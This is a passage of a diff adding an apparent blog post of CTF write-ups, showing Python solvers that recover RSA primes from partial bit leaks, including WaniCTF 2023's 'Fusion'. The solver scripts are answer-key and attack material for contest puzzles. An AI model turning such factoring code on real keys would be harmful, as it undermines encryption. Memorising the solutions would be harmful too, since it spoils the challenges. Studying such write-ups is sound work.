+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; 
+            &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;nx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sorted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nx&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rx&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;this algorithm solves the given problem at hand easily.&lt;/p&gt;
+
+&lt;h2 id=&quot;fusion-wanictf-2023&quot;&gt;Fusion [WaniCTF 2023]&lt;/h2&gt;
+
+&lt;p&gt;Another RSA problem where we are again told about $n$, $e$ and $c$ and the extra information provided to us this time is the information about the odd-positioned bits of $p$ and the even-positioned bits of $q$. Turns out that this system is still cryptographically insecure.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;The idea is similar to the previous ones. We need to leak off bit by bit information about the two primes $p$ and $q$. Since we already know that they are odd primes, we already know about their LSB’s. We have to tweak the above algorithm and it would leak off the entire information about the bits of the primes $p$ and $q$ one by one.&lt;/p&gt;
+
+&lt;p&gt;The algorithm works as follows. Suppose we are the $i$th position and we need to determine the $i$th bits of $p$ and $q$. If $i$ is even, we know the information about $q_i$ and if $i$ is odd, then we know the information about $p_i$. In each case, we need to check for two cases and propogate the answers from the previous case to the next ones using bit masking.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Cryptodome.Util.number&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;math&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ceil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log2&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]),&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ceil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;q0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q0&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;nx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nx&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;p0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p0&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; 
+                &lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
